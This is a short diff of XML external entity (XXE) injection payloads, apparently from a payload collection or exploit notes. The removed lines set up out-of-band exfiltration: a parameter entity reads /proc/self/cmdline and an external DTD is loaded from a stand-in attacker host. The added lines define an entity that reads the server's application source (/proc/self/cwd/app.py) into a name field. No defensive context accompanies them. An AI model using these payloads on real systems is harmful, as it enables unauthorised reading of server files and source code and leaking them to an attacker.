@@ -134,11 +134,10 @@
 
 
 
-
 <?xml version="1.0"?>
 <!DOCTYPE data [
-  <!ENTITY % file SYSTEM "file:///proc/self/cmdline">
-  <!ENTITY % dtd SYSTEM "http://your-server.com/evil.dtd">
-  %dtd;
+  <!ENTITY xxe SYSTEM "file:/proc/self/cwd/app.py">
 ]>
-<data>test</data>
+<user>
+  <name>&xxe;</name>
+</user>
